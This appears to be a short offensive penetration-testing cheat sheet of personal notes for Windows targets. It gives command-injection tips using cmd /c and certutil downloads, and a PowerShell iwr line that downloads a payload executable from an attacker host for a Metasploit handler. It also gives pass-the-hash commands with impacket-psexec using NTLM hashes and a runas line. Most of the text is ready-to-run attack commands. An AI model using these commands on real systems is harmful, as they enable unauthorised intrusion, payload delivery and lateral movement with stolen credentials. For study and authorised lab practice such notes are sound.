# RCE / Command Injection
- If normal command execution doesn't work, try to use `cmd /c <your command here>`.
- You can add `certutil.exe` command without the name of the output file.
- You can add `certutil.exe` URL without single/double quotes.
- If you cannot run executables like whoami, systeminfo; then go to `C:\Windows\system32` folder to run this commands, because they may not be on our `PATH`.

# File Transfer
**Note: Netcat doesn't know how to handle a staged payload. To get a functional interactive command prompt, we can use Metasploit's `multi/handler` module, which works for the majority of staged, non-staged, and more advanced payloads.**
PowerShell:
```
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
```
# Pass The Hash
## psexec.py
```
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <user>@<ip>
```
```
python psexec.py -hashes 00000000000000000000000000000000:<NTLM> Administrator@192.168.1.105
```
## smbclient.py
```

```
[HINT](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)
## runas
```
runas /user:corp.com\robert powershell.exe
```
